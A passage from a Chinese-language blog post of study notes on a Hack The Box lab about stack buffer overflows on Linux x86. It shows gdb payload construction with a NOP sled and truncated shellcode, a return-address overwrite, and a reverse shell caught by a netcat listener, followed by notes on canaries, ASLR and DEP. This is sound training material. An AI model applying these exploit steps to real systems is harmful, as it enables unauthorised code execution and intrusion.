+<h4 id="Notes-3"><a href="#Notes-3" class="headerlink" title="Notes"></a>Notes</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817</span><br><span class="line">     NOPs = "\x90" * 124</span><br><span class="line">Shellcode = "\xda\xca\xba\xe4\x11...&lt;SNIP&gt;...\x5a\x22\xa2"</span><br><span class="line">      EIP = "\x66" * 4'</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Exploit-with-Shellcode"><a href="#Exploit-with-Shellcode" class="headerlink" title="Exploit with Shellcode"></a>Exploit with Shellcode</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...&lt;SNIP&gt;...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')</span><br><span class="line"></span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line"></span><br><span class="line">Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...&lt;SNIP&gt;...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x56555551 in bowfunc ()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接下来，我们检查shellcode的第一个字节是否匹配NOPS之后的字节。</p>
+<h4 id="The-Stack-4"><a href="#The-Stack-4" class="headerlink" title="The Stack"></a>The Stack</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) x/2000xb $esp+550</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4</span><br><span class="line">						 # |----&gt; Shellcode begins</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Identification-of-the-Return-Address"><a href="#Identification-of-the-Return-Address" class="headerlink" title="Identification of the Return Address"></a>Identification of the Return Address</h2><p>在检查我们仍然使用shellcode控制EIP之后，我们现在需要一个NOP所在的内存地址来告诉EIP跳转到它。这个内存地址不能包含我们之前发现的任何错误字符。</p>
+<h4 id="GDB-NOPS"><a href="#GDB-NOPS" class="headerlink" title="GDB NOPS"></a>GDB NOPS</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) x/2000xb $esp+1400</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">0xffffd5ec:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55</span><br><span class="line">0xffffd5f4:	0x55	0x55	0x55	0x55	0x55	0x55	0x90	0x90</span><br><span class="line">								# End of "\x55"s   ----&gt;|  |---&gt; NOPS</span><br><span class="line">0xffffd5fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd604:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd60c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd614:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd61c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd624:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd62c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd634:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd63c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd644:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90</span><br><span class="line">0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4</span><br><span class="line">						 # |---&gt; Shellcode</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在这里，我们现在必须选择一个地址，我们引用<code>EIP</code>，并从这个地址开始一个字节接一个字节地读取和执行。在这个例子中，我们取地址<code>0xffffd64c</code>。如图所示，它看起来像这样：</p>
+<h4 id="Buffer-缓冲-1"><a href="#Buffer-缓冲-1" class="headerlink" title="Buffer 缓冲"></a>Buffer 缓冲</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_9.png" alt="image"></p>
+<p>选择内存地址后，我们替换“<code>\x66</code>”，它覆盖EIP，告诉它跳转到<code>0xffffd64c</code>地址。请注意，地址的输入是反向输入的。</p>
+<h4 id="Notes-4"><a href="#Notes-4" class="headerlink" title="Notes"></a>Notes</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">   Buffer = "\x55" * (1040 - 100 - 95 - 4) = 841</span><br><span class="line">     NOPs = "\x90" * 100</span><br><span class="line">Shellcode = "\xda\xca\xba\xe4\x11\xd4...&lt;SNIP&gt;...\x5a\x22\xa2"</span><br><span class="line">      EIP = "\x4c\xd6\xff\xff"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>由于我们的shellcode创建了一个反向shell，我们让<code>netcat</code>监听端口31337。</p>
+<h4 id="Netcat-Reverse-Shell-Listener"><a href="#Netcat-Reverse-Shell-Listener" class="headerlink" title="Netcat - Reverse Shell Listener"></a>Netcat - Reverse Shell Listener</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">student@nix-bow:$ nc -nlvp 31337</span><br><span class="line"></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 31337)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在启动我们的<code>netcat</code>监听器之后，我们现在再次运行我们的改编漏洞，然后触发CPU连接到我们的监听器。</p>
+<h4 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...&lt;SNIP&gt;...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Netcat-Reverse-Shell-Listener-1"><a href="#Netcat-Reverse-Shell-Listener-1" class="headerlink" title="Netcat - Reverse Shell Listener"></a>Netcat - Reverse Shell Listener</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Listening on [0.0.0.0] (family 0, port 31337)</span><br><span class="line">Connection from 127.0.0.1 33504 received!</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid=1000(student) gid=1000(student) groups=1000(student),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们现在看到我们从本地IP地址获得了连接。然而，如果我们有一个外壳，这并不明显。因此，我们键入命令“<code>id</code>”以获取有关用户的更多信息。如果我们得到一个带有信息的返回值，我们知道我们在一个shell中，如示例所示。</p>
+<h1 id="Proof-Of-Concept"><a href="#Proof-Of-Concept" class="headerlink" title="Proof-Of-Concept"></a>Proof-Of-Concept</h1><h2 id="Public-Exploit-Modification"><a href="#Public-Exploit-Modification" class="headerlink" title="Public Exploit Modification"></a>Public Exploit Modification</h2><p>在我们的渗透测试中，我们可能会遇到过时的软件，并发现一个利用已知漏洞的漏洞。这些攻击通常在代码中包含故意的错误。这些错误通常作为一种安全措施，因为缺乏经验的初学者无法直接执行这些漏洞，以防止可能对个人和组织造成伤害。 受到这种脆弱性的影响。</p>
+<p>要编辑和自定义它们，最重要的是了解漏洞是如何工作的，漏洞在什么函数中，以及如何触发执行。对于几乎所有的漏洞，我们将不得不调整shellcode以适应我们的条件。相反，这取决于漏洞利用的复杂性。</p>
+<p>它对shellcode是否适应保护机制起着重要作用。在这种情况下，不同长度的shellcode可能会产生不必要的效果。这些漏洞可以用不同的语言编写，也可以仅作为描述。</p>
+<p>例如，漏洞利用可能与操作系统不同，从而导致不同的指令。必须建立一个相同的系统，在目标系统上盲目运行之前，我们可以尝试利用漏洞。此类漏洞可能导致系统崩溃，从而阻止我们进一步测试该服务。由于在新环境中不断找到我们的方式并始终学会保持全局观是我们日常生活的一部分，因此我们必须利用新的情况来提高和完善这种能力。因此，我们可以使用两个应用程序来训练这些技能。</p>
+<h2 id="Prevention-Techniques-and-Mechanisms"><a href="#Prevention-Techniques-and-Mechanisms" class="headerlink" title="Prevention Techniques and Mechanisms"></a>Prevention Techniques and Mechanisms</h2><p>防止缓冲区溢出的最佳保护措施是有安全意识的编程。软件开发人员应该告知自己相关的陷阱，并努力实现有意识的安全编程。此外，还有一些安全机制可以支持开发人员并防止用户利用这些漏洞。</p>
+<p>其中包括安全机制：</p>
+<ul>
+<li><code>Canaries</code></li>
+<li><code>Address Space Layout Randomization</code> (<code>ASLR</code>)</li>
+<li><code>Data Execution Prevention</code> (<code>DEP</code>)</li>
+</ul>
+<h2 id="Canaries"><a href="#Canaries" class="headerlink" title="Canaries"></a>Canaries</h2><p><code>canaries</code>是写入缓冲区和控制数据之间的堆栈的已知值，用于检测缓冲区溢出。其原理是，在缓冲区溢出的情况下，canaries将首先被覆盖，并且操作系统在运行时检查canaries是否存在且未被更改。</p>
+<h2 id="地址空间布局随机化（ASLR）"><a href="#地址空间布局随机化（ASLR）" class="headerlink" title="地址空间布局随机化（ASLR）"></a>地址空间布局随机化（ASLR）</h2><p>地址空间布局随机化（<code>ASLR</code>）是一种防止缓冲区溢出的安全机制。它使某些类型的攻击更加困难，因为它很难在内存中找到目标地址。操作系统使用ASLR对我们隐藏相关的内存地址。因此，需要猜测地址，错误的地址很可能导致程序崩溃，因此，只有一次尝试。</p>
+<h2 id="Data-Execution-Prevention-DEP"><a href="#Data-Execution-Prevention-DEP" class="headerlink" title="Data Execution Prevention (DEP)"></a>Data Execution Prevention (DEP)</h2><p><code>DEP</code>是Windows XP中提供的一项安全功能，后来在Service Pack 2（SP2）及更高版本中，程序在执行期间受到监视，以确保它们干净地访问内存区域。如果程序试图以未经授权的方式调用或访问程序代码，则DEP终止程序。</p>
+<h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2023/11/11/Stack-BasedBufferOverflowsonLinuxx86HTB/">http://mikannse.space/2023/11/11/Stack-BasedBufferOverflowsonLinuxx86HTB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E5%AE%89/">网安</a><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/15/Information%20Gathering%20-%20Web%20EditionHTB/" title="Information Gathering - Web EditionHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Information Gathering - Web EditionHTB</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/09/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%94%E4%BA%94)%E4%B9%8BTHMAnonymousPlayground/" title="打靶记录(五五)之THMAnonymousPlayground"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">打靶记录(五五)之THMAnonymousPlayground</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/17/Cross-Site%20Scripting%20(XSS)HTB/" title="Cross-Site Scripting (XSS)HTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-17</div><div class="title">Cross-Site Scripting (XSS)HTB</div></div></a></div><div><a href="/2023/10/24/HackingWordPressHTB/" title="HackingWordPressHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-24</div><div class="title">HackingWordPressHTB</div></div></a></div><div><a href="/2023/11/15/Information%20Gathering%20-%20Web%20EditionHTB/" title="Information Gathering - Web EditionHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-15</div><div class="title">Information Gathering - Web EditionHTB</div></div></a></div><div><a href="/2023/11/07/IntroToAssemblyShellcodingANDSkill/" title="IntroToAssemblyShellcodingANDSkillHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-07</div><div class="title">IntroToAssemblyShellcodingANDSkillHTB</div></div></a></div><div><a href="/2023/11/04/IntroToAssemblyArchANDAssembDebugger/" title="IntroToAssemblyArchANDAssembDebuggerHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-04</div><div class="title">IntroToAssemblyArchANDAssembDebuggerHTB</div></div></a></div><div><a href="/2023/10/28/IntroductiontoBashScriptingHTB/" title="IntroductiontoBashScriptingHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-28</div><div class="title">IntroductiontoBashScriptingHTB</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Development-Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Exploit Development Introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0-Day-Exploits"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">0-Day Exploits</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#N-Day-Exploits"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">N-Day Exploits</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Local-Exploits"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">Local Exploits</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Remote-Exploits"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">Remote Exploits</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DoS-Exploits"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">DoS Exploits</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebApp-Exploits"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">WebApp Exploits</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CPU-Architecture"><span class="toc-number">1.2.</span> <span class="toc-text">CPU Architecture</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Von-Neumann-Architecture"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">Von-Neumann Architecture</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Memory"><span class="toc-number">1.2.1.</span> <span class="toc-text">Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Primary-Memory"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">Primary Memory</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Secondary-Memory"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">Secondary Memory</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Control-Unit"><span class="toc-number">1.2.2.</span> <span class="toc-text">Control Unit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Central-Processing-Unit"><span class="toc-number">1.2.3.</span> <span class="toc-text">Central Processing Unit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RISC"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">RISC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CISC"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">CISC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Instruction-Cycle"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">Instruction Cycle</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fundamentals"><span class="toc-number">2.</span> <span class="toc-text">Fundamentals</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Based-Buffer-Overflow"><span class="toc-number">2.1.</span> <span class="toc-text">Stack-Based Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Memory"><span class="toc-number">2.1.1.</span> <span class="toc-text">The Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Buffer"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">Buffer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#text"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">.text</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">.data</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bss"><span class="toc-number">2.1.1.4.</span> <span class="toc-text">.bss .</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#The-Heap"><span class="toc-number">2.1.1.5.</span> <span class="toc-text">The Heap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#The-Stack"><span class="toc-number">2.1.1.6.</span> <span class="toc-text">The Stack</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerable-Program"><span class="toc-number">2.1.2.</span> <span class="toc-text">Vulnerable Program</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bow-c"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">Bow.c</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Disable-ASLR"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">Disable ASLR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">编译</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerable-C-Functions"><span class="toc-number">2.1.3.</span> <span class="toc-text">Vulnerable C Functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GDB-Introductions"><span class="toc-number">2.1.4.</span> <span class="toc-text">GDB Introductions</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB-AT-amp-T-Syntax"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">GDB - AT&amp;T Syntax</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB-Change-the-Syntax-to-Intel"><span class="toc-number">2.1.4.2.</span> <span class="toc-text">GDB - Change the Syntax to Intel</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Change-GDB-Syntax"><span class="toc-number">2.1.4.3.</span> <span class="toc-text">Change GDB Syntax</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB-Intel-Syntax-GDB%EF%BC%88Intel-Syntax%EF%BC%89"><span class="toc-number">2.1.4.4.</span> <span class="toc-text">GDB - Intel Syntax GDB（Intel Syntax）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intel-Syntax"><span class="toc-number">2.1.5.</span> <span class="toc-text">Intel Syntax</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AT-amp-T-Syntax-AT-T"><span class="toc-number">2.1.6.</span> <span class="toc-text">AT&amp;T Syntax AT T</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CPU-Registers"><span class="toc-number">2.2.</span> <span class="toc-text">CPU Registers</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Data-registers"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">Data registers</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pointer-registers"><span class="toc-number">2.2.0.2.</span> <span class="toc-text">Pointer registers</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-Frames"><span class="toc-number">2.2.1.</span> <span class="toc-text">Stack Frames</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Prologue"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">Prologue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Epilogue"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">Epilogue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Index-registers"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">Index registers</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Compile-in-64-bit-Format"><span class="toc-number">2.2.1.4.</span> <span class="toc-text">Compile in 64-bit Format</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB-Intel-Syntax-GDB%EF%BC%88Intel-Syntax%EF%BC%89-1"><span class="toc-number">2.2.1.5.</span> <span class="toc-text">GDB - Intel Syntax GDB（Intel Syntax）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Endianness"><span class="toc-number">2.2.2.</span> <span class="toc-text">Endianness</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Take-Control-of-EIP"><span class="toc-number">3.1.</span> <span class="toc-text">Take Control of EIP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Segmentation-Fault"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">Segmentation Fault</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Buffer-1"><span class="toc-number">3.1.0.2.</span> <span class="toc-text">Buffer</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Determine-The-Offset"><span class="toc-number">3.1.1.</span> <span class="toc-text">Determine The Offset</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Create-Pattern"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">Create Pattern</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB-Using-Generated-Pattern"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">GDB - Using Generated Pattern</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB-EIP"><span class="toc-number">3.1.1.3.</span> <span class="toc-text">GDB - EIP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB-Offset"><span class="toc-number">3.1.1.4.</span> <span class="toc-text">GDB - Offset</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Buffer-2"><span class="toc-number">3.1.1.5.</span> <span class="toc-text">Buffer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB-Offset-1"><span class="toc-number">3.1.1.6.</span> <span class="toc-text">GDB Offset</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Buffer-3"><span class="toc-number">3.1.1.7.</span> <span class="toc-text">Buffer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Determine-the-Length-for-Shellcode"><span class="toc-number">3.2.</span> <span class="toc-text">Determine the Length for Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Shellcode-Length"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">Shellcode - Length</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Buffer-%E7%BC%93%E5%86%B2"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">Buffer 缓冲</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB"><span class="toc-number">3.2.0.3.</span> <span class="toc-text">GDB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Buffer-4"><span class="toc-number">3.2.0.4.</span> <span class="toc-text">Buffer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Identification-of-Bad-Characters"><span class="toc-number">3.3.</span> <span class="toc-text">Identification of Bad Characters</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Character-List"><span class="toc-number">3.3.0.1.</span> <span class="toc-text">Character List</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Calculate-CHARS-Length"><span class="toc-number">3.3.0.2.</span> <span class="toc-text">Calculate CHARS Length</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Notes"><span class="toc-number">3.3.0.3.</span> <span class="toc-text">Notes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB-Breakpoint"><span class="toc-number">3.3.0.4.</span> <span class="toc-text">GDB Breakpoint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Send-CHARS"><span class="toc-number">3.3.0.5.</span> <span class="toc-text">Send CHARS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#The-Stack-1"><span class="toc-number">3.3.0.6.</span> <span class="toc-text">The Stack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#The-Stack-CHARS"><span class="toc-number">3.3.0.7.</span> <span class="toc-text">The Stack - CHARS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Notes-1"><span class="toc-number">3.3.0.8.</span> <span class="toc-text">Notes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Send-CHARS-Without-Null-Byte"><span class="toc-number">3.3.0.9.</span> <span class="toc-text">Send CHARS - Without Null Byte</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#The-Stack-2"><span class="toc-number">3.3.0.10.</span> <span class="toc-text">The Stack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Notes-2"><span class="toc-number">3.3.0.11.</span> <span class="toc-text">Notes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Send-CHARS-Without-%E2%80%9C-x00%E2%80%9D-amp-%E2%80%9C-x09"><span class="toc-number">3.3.0.12.</span> <span class="toc-text">Send CHARS - Without “\x00” &amp; “\x09</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#The-Stack-3"><span class="toc-number">3.3.0.13.</span> <span class="toc-text">The Stack</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Generating-Shellcode"><span class="toc-number">3.4.</span> <span class="toc-text">Generating Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSFvenom-Syntax"><span class="toc-number">3.4.0.1.</span> <span 